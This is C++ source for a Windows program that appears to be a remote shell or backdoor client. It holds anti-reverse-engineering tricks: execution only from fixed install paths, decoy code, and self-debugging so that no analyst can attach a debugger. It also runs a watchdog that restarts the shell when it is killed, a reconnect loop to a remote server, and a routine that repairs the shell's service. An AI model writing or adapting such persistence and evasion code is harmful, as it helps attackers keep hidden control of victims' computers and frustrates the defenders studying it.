#include "general.h"
#include "serviceutils.h"
#include "utils.h"

#include <Windows.h>
#include <psapi.h>

//Thread used to check if main shell is running, and if it not start it
void CheckBackupThread();

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//Alloc console for debug purposes
	//AllocConsole();
	//FILE* f;
	//freopen_s(&f, "CONOUT$", "w", stdout);
	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { //Check that full path is at least one of the 2 valid ones, to mess with reverse engineers dumping this exe
		return;
	}

	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CheckBackupThread, NULL, NULL, NULL);

	//BEGINNING OF USELESS CODE

	if (!strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path == backup module path, do useless shit
		while (true) {
			char* uselessString = "GetNativeSystemInfo"; //Just to fuck with reverse engineers
useless_backup_shell_code:
			if (!IsDebuggerPresent()) { //I mean, why not
				HMODULE hUseless = GetModuleHandle(TEXT("kernel32.dll")); //Get random ass handle cuz people put hooks on this shit when debugging
				if (IsBadReadPtr(uselessString, 0)) { //This always returns 0 if second parameter is 0 so it will never jump (dont write if(false) since compiler will optimize and delete the branch
					goto non_backup_shell_code;
				}
			}
			//Some reverse engineers assume you will do process hijacking to svchost (it's common practice since svchost always exists and it's a common process so easy to "hide")
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Utils::getProcess("svchost.exe"));
			//Now do some useless operation with this handle
			MEMORY_BASIC_INFORMATION mbi;
			if (VirtualQueryEx(hProc, (LPCVOID)uselessString, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) { //Do useless stuff on this data
				if (mbi.Protect)
					goto useless_backup_shell_code;
			}
		}
	}

	//END OF USELESS CODE

	//BEGINNING OF REAL SHELL CODE
non_backup_shell_code:
	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { //Code repetition (using functions is counterproductive since they could hook them easily)
		return;
	}
	while (true)
	{
		if (!Client::main_client.connected)
		{
			while (!Client::main_client.Connect())
			{
				Sleep(5000);
			}
		}
		else {
			//Here maybe check if the ShellManager service is still active, and if it isn't download it if necessary and start it up again
			Service::CheckAndRepairService();
		}

		Sleep(1000);
	}

	return 0;
}

void DebuggerThread() {
	//Just ignore any debug events and continue execution
	DEBUG_EVENT debug_event = { 0 };
	for (;;)
	{
		if (!WaitForDebugEvent(&debug_event, INFINITE))
			return;
		//Place your code to handle the event here:
		//
		//End
		ContinueDebugEvent(debug_event.dwProcessId,
			debug_event.dwThreadId,
			DBG_CONTINUE);
	}
}

void CheckBackupThread() {
	//Check if this executable is the backup executable
	if (!strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path == backup module path, do nothing
		return;
	}
	else { //Check if another backup shell is running
		if (Utils::getProcess(SHELL_BACKUP_NAME)) { //If another backup shell is running exit the process
			ExitProcess(1);
		}
	}

	//Get an handle to the main shell
	HANDLE hProc = 0;
	auto procID = Utils::getProcess(ExeModuleName().c_str());
	//If procID is 0 attempt to start the shell
	if (!procID) {
		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		ZeroMemory(&info, sizeof(info));
		ZeroMemory(&processInfo, sizeof(processInfo));
		//Create process with debugging flag, since only one debugger can be attached to a process at a time
		while (!CreateProcessA(SHELL_EXE, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &info, &processInfo))
		{
			Sleep(100);
		}
		CloseHandle(processInfo.hThread);
		hProc = processInfo.hProcess;
		//Start debugger thread to handle debug events (just skip through them)
		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)DebuggerThread, NULL, NULL, NULL);
	}
	else {
		//If main shell is already started check that the parent process path == SHELL_BACKUP_PATH
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(Utils::getProcess(SHELL_NAME)));
		if (!hProcess)
			ExitProcess(1);

		CHAR Buffer[MAX_PATH];
		if (GetModuleFileNameExA(hProcess, 0, Buffer, MAX_PATH))
		{
			// At this point, buffer contains the full path to the executable
			if (strcmp(Buffer, SHELL_BACKUP_EXE)) {
				//They don't match
				ExitProcess(1);
			}
			//They match so go on and do shit
		}
		else
		{
			ExitProcess(1);
		}
		CloseHandle(hProcess);
	}
	if(!hProc)
		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

	//To store debug events
	DEBUG_EVENT debug_event = { 0 };

	while (true) {
		//This lets the
		WaitForDebugEvent(&debug_event, INFINITE);
		ContinueDebugEvent(debug_event.dwProcessId,
			debug_event.dwThreadId,
			DBG_CONTINUE);

		//Get exit code
		DWORD exitCode;
		while (!GetExitCodeProcess(hProc, &exitCode)) {
			Sleep(100);
		}

		//If exit code is STILL_ACTIVE the process hasn't been stopped yet
		if (exitCode != STILL_ACTIVE) { //If process has stopped attempt to restart it
			CloseHandle(hProc);
			STARTUPINFO info = { sizeof(info) };
			PROCESS_INFORMATION processInfo;
			while (!CreateProcessA(SHELL_EXE, (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
			{
				Sleep(100);
			}
			CloseHandle(processInfo.hThread);
			hProc = processInfo.hProcess;
		}
		Sleep(100);
	}
}